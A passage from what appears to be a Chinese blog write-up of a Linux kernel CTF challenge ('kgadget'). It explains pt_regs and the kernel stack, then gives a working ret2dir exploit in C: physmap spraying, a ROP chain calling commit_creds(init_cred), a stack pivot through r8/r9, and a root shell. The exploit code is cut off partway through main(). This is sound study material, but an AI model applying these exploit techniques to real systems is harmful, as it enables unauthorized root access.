class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看上去像是寄存器组。查询相关<a href="https://blog.csdn.net/u012489236/article/details/116614606?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E5%86%85%E6%A0%B8%E6%A0%88%E5%B8%83%E5%B1%80&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-116614606.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187">资料</a>与源码后，渐渐地才搞清楚来龙去脉。</p><p>首先要清楚的是，用户态程序和内核进行交互的最重要的方式就是系统调用。系统调用就是内核开放给用户程序的一个个接口。在每一次触发系统调用时，Linux都会从用户态转为内核态。在转换的过程中，内核会创建一个自己的栈空间，而不会使用用户态的栈空间。</p><p>下面是x86-64位下的<code>THREAD_SIZE</code>值声明，其值应该为页大小左移2位，即16KB。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASAN_STACK_ORDER 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASAN_STACK_ORDER 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE_ORDER(2 + KASAN_STACK_ORDER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE  (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)</span></span><br></pre></td></tr></table></figure><p>提到pt_regs，就必须要说<code>task_struct</code>结构体，这是Linux系统的<code>PCB</code>（进程控制块），保存有一个进程的所有信息（父子进程、时间、状态等），具体的分析参见<a href="https://blog.csdn.net/qq_41209741/article/details/82870876?ops_request_misc=&request_id=&biz_id=102&utm_term=task_struct&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-82870876.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187">资料</a>。其中有一个void*类型的字段stack，存放的就是线程的栈起始地址。通过下面的函数我们可以找到这个线程的pt_regs：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">task_stack_page</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> task_struct *task)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> task-&gt;<span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> task_pt_regs(task) \</span></span><br><span class="line"><span class="meta">(&#123;\</span></span><br><span class="line"><span class="meta">unsigned long __ptr = (unsigned long)task_stack_page(task);\</span></span><br><span class="line"><span class="meta">__ptr += THREAD_SIZE - TOP_OF_KERNEL_STACK_PADDING;\</span></span><br><span class="line"><span class="meta">((struct pt_regs *)__ptr) - 1;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>这里的THREAD_SIZE就是栈的大小16KB，后面的TOP_OF_KERNEL_STACK_PADDING取0，也即往上加16KB之后减去一个pt_regs的大小就是线程的pt_regs结构体的位置。</p><p>好，现在我们再回到这道题目上面来。还是这张图，在0x155的lea指令就将rdx的值赋值为了pt_regs的地址值。我们通过上面的pt_regs结构体声明可以计算一下这个结构体的大小，应该为0xA8字节（unsigned long占8字节），因此此时的rax-0xA8就是pt_regs的起始地址。然后这里是将其中的7个属性值全部赋值为无效值，查看pt_regs结构体发现实际上就是销毁了r15，r14，r13，r12，r11，rbp，r10这5个寄存器的值，仅仅保留后面的r9、r8和其他系统调用必需的寄存器。这也与题目中printk打印出来的字符串提示相吻合，只有r8和r9寄存器可用。至于具体用来干嘛，后面再看。</p><p><img src="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png"><br><img src="https://img-blog.csdnimg.cn/3d9b9d431d0447c7bbfb687dedc89b8a.png"></p><p>在printk之后，指令<code>call __x86_indirect_thunk_rbx</code>实际上等同于<code>call rbx</code>。</p><h3 id="release函数分析"><a href="#release函数分析" class="headerlink" title="release函数分析"></a>release函数分析</h3><p><img src="https://img-blog.csdnimg.cn/8b911919d6b44300a6421b0e34089346.png"><br>在release函数中有一个raw_spin_lock函数调用，这是一个自旋锁，用于在底层处理多线程或多进程访问同一个对象的竞争问题。与本题的关系不大，深入的分析参见<a href="https://blog.csdn.net/DroidPhone/article/details/7395983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165718771616781685317780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165718771616781685317780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-7395983-null-null.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&utm_term=raw_spin_lock&spm=1018.2226.3001.4187">资料</a>。</p><p>之后还有一个pv_ops，使用IDA打开vmlinux之后发现这是一个函数指针数组。其第85个元素指向<code>__raw_callee_save___native_queued_spin_unlock</code>函数，应该也是和内核的互斥锁有关，这里不进行详细分析。</p><p>open、read、write函数与release函数基本上差不多，不做分析。看来对我们有用的就只有ioctl函数了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>顺便提一句，这道题的bzImage坑了我两天时间，用Linux官方的extract_vmlinux没有办法解压成vmlinux，直到安装了vmlinux-to-elf之后才得以解决，原来这个bzImage是用zstd压缩的，必须安装zstd包才能解压。。。。。。</p><p>本题的ioctl函数中实际上是将传入的第三个参数作为函数指针，在内核中执行。而要知道本题开启了SMEP保护，因此不能传入一个用户态的指针，而应该是内核态指针。</p><p>前面我们提到了direct mapping area这块内核空间，其能够与用户态访问相同的物理地址空间，因此我们可以利用这块空间，在用户态布置好ROP，然后让内核访问这里的空间，就相当于是执行用户态中的ROP。但是话说回来，我们不知道具体哪一块用户态地址和哪一块内核地址指向相同，这就需要我们使用滑梯（slider）这种手段了，通过大量的无效ROP来提升我们攻击成功的概率。</p><h4 id="Step-1-硬编码函数地址"><a href="#Step-1-硬编码函数地址" class="headerlink" title="Step 1: 硬编码函数地址"></a>Step 1: 硬编码函数地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu kvm64,+smep,+smap \</span><br><span class="line">        -smp cores=2,threads=2 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -initrd ./rootfs.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure><p>上面是起qemu的命令，可以看到有nokaslr选项，说明没有开启kaslr，我们通过vmlinux就可以获取到关键函数的内核地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">u_int64_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">u_int64_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF810C9540</span>;</span><br></pre></td></tr></table></figure><h4 id="Step-2-申请大空间"><a href="#Step-2-申请大空间" class="headerlink" title="Step 2: 申请大空间"></a>Step 2: 申请大空间</h4><p>接下来，我们需要申请很大的空间，存放ROP链。这里每一次申请大小均为一页的大小，其中mmap函数fd参数为-1表示不需要文件描述符，以匿名的方式分配空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="Step-3-填充空间"><a href="#Step-3-填充空间" class="headerlink" title="Step 3: 填充空间"></a>Step 3: 填充空间</h4><p>我们使用ROP来填充分配到的所有空间，经过ROPgadget查询发现，没有<code>mov rdi, rax; ret</code>这样的gadget，因此我们无法使用<code>commit_creds(prepare_kernel_cred(NULL))</code>来提权，因为内部函数的执行结果保存在rax中，必须要将其转移到rdi才行，这里没有这个gadget，那我们就换一种方式：<code>commit_creds(init_cred)</code>，这里的init_cred在.data段，就是表示root权限的creds结构体。之后我们需要正常返回到用户态中，这里原文使用的是一个函数<code>swapgs_restore_regs_and_return_to_usermode</code>。通过函数名我们可以知道这是一个保存pt_regs结构并且返回到用户态的函数。至于为什么不能像前面两道题那样分别将<code>swapgs</code>和<code>iretq</code>的gadget保存在ROP中，猜测是因为这个vmlinux中没有<code>iretq; ret</code>这样的gadget。</p><p>可以看到下图中，函数一开始将寄存器基本上全pop了一遍，因为正常情况下调用这个函数的时候栈中只剩下pt_regs这个结构体，因此这是将结构体中保存的寄存器值再弹出到寄存器中。由于我们这里是伪造的ROP，因此不需要前面的pop，直接返回到第一个非pop语句即可。</p><p><img src="https://img-blog.csdnimg.cn/409a5e9522c34c45a3f5469e52dd2cc5.png"><br><img src="https://img-blog.csdnimg.cn/ec9b7ccdc88146b9ba3fc5a07a7dc84b.png"><br>上图红框的部分有两个pop指令，需要我们在ROP链中再添加两个无效的值，这也算是ROP到这个函数的一个基本的姿势了。之后只需要跟上我们先前在<code>save_status</code>中保存的值就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; page_size / <span class="number">8</span> - <span class="number">0x10</span>; index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = *(<span class="type">size_t</span>*)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-4-构造栈迁移"><a href="#Step-4-构造栈迁移" class="headerlink" title="Step 4: 构造栈迁移"></a>Step 4: 构造栈迁移</h4><p>我们的ROP链都是在用户空间编写的，能够映射到内核空间的某个地方，但是要执行这些ROP还需要我们将栈引导到这些内核映射区中。这就要使用到ioctl函数中的地址执行功能了，可以让函数指针指向一个能为rsp赋值的gadget，可以进行栈迁移。</p><p>需要注意的是，本题的栈迁移构造条件还是较为苛刻的，我们计划将函数指针赋值为一个可能指向我们spray ROP的地址，在其中写入能够add rsp的gadget，这样能够让内核的栈指针指向pt_regs结构，在pt_regs结构中我们只能利用r9和r8这两个寄存器构造ROP，在这两个寄存器中我们需要构造一个栈迁移，即写入诸如pop rsp这一类的gadget。经过测试发现，对于第一步的add rsp，我们构造的ROP距离rsp有0xC0，而有一个gadget<code>add rsp, 0xA0; pop rbx; pop r12; pop r13; ret</code>刚好满足我们的要求。使用这个gadget可以让我们成功进行栈迁移。</p><p>至此，所有的逻辑都已经清晰可见。其本质就是栈迁移到我们构造的地址，只是利用了direct mapping area这个区域的特性而已。</p><p>最终的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device 